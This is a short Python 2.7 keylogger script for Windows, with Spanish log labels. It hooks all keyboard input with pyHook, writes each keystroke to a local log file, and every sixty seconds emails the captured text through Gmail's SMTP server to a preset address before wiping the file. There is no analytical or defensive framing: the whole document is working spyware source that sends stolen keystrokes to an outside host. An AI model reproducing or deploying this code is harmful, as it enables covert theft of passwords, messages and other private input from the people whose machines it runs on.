#windows
#python 2.7
#pip install pyhook...whl
#pip install pywin32.whl

import pyHook, pythoncom, sys, logging
import time, datetime
waitSeconds = 60
timeout = time.time() + waitSeconds
file_log = 'C:\\e\\log.txt'

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def sendEmail(user, pwd, recipient, subject, body):
    import smtplib
    gmail_user = user
    gmail_pwd = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body
    message = """ \From: %s \To: %s \Subject: %s \n%s """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pwd)
        server.sendmail(FROM, TO, message)
        server.close()
        print 'successfully sent the mail'
    except:
        print "failed to send mail"

def formatAndSendEmail():
    with open(file_log, 'r') as f:
        actualdate=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data = f.read().replace('\n', '')
        data='Log caputarado el '+actualdate+'\n'+data
        sendEmail('email','password','email','Log capturado',data)
        f.seek(0)
        f.truncate()


def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        formatAndSendEmail()
        timeout=time.time()+waitSeconds
    pythoncom.PumpWaitingMessages()

